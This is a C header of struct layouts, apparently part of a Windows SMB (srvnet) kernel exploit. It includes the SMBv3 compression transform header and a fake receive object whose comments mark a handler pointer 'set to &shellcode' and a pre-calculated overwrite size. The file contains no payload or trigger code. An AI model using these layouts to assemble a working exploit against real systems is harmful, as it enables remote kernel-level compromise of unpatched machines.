typedef struct _SRVNET_RECV {
BYTE unknown0[0x50];
PKSPIN_LOCK SpinLock; // 0x50 lock is acquired during processing
LIST_ENTRY List; // 0x58 Flink and Blink point to self
BYTE unknown1[0xa0];
PVOID **pHandlers; // 0x110 pointer to handler table
QWORD qwUnknown2;
QWORD qwOverwriteSize; // 0x118 set to pre-calculated overwrite amount
QWORD qwUnknown3;
DWORD dwUnknown4;
DWORD dwInvokeIndex; // 0x13c set to 3
BYTE unknown5[0xb0];
// original struct ends
QWORD qwFuncArgument;
PVOID HandlerFunction; // set to &shellcode
} SRVNET_RECV, *PSRVNET_RECV;


typedef struct SRVNET_BUFFER_HDR
{
  LIST_ENTRY List;      
  USHORT Flag;          
  BYTE  unknown0[4];     
  WORD  unknown1;        
  PBYTE pNetRawBuffer;
  DWORD dwNetRawBufferSize;
  DWORD dwMsgSize;
  DWORD dwNonPagedPoolSize;
  DWORD dwPadding;
  PVOID pNonPagedPoolAddr;
  PMDL  pMDL1;
  DWORD dwByteProcessed;
  BYTE  unknown2[4];
  _QWORD unknown3;
  PMDL pMDL2;
  PSRVNET_RECV pSrvNetWskStruct;
  DWORD unknown4;
  char unknown5[12];
  char unknown6[32];
  MDL mdl1;
  char unknow7[24];
  MDL mdl2;
};
typedef struct _FEA
{
  UCHAR fEA;
  UCHAR cbName;
  USHORT cbValue;
}FEA,*PFEA;
typedef struct _FEALIST
{
  ULONG cbList;
  FEA list[1];
}FEALIST,*PFEALIST;
struct SRVNET_POOLHDR {
	DWORD size;
	char unknown[12];
	SRVNET_BUFFER hdr;
};
struct _MDL {
    struct _MDL *Next;
    CSHORT Size;
    CSHORT MdlFlags;
    struct _EPROCESS *Process;
    PVOID MappedSystemVa;          
    PVOID StartVa;                 
    ULONG ByteCount;
    ULONG ByteOffset;
} MDL, *PMDL;
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
typedef struct _COMPRESSION_TRANSFORM_HEADER
{
  ULONG ProtocolId;
  ULONG OriginalCompressedSegmentSize;
  USHORT CompressionAlgorithm;
  USHORT Flags;
  ULONG Length;
}COMPRESSION_TRANSFORM_HEADER, *PCOMPRESSION_TRANSFORM_HEADER;
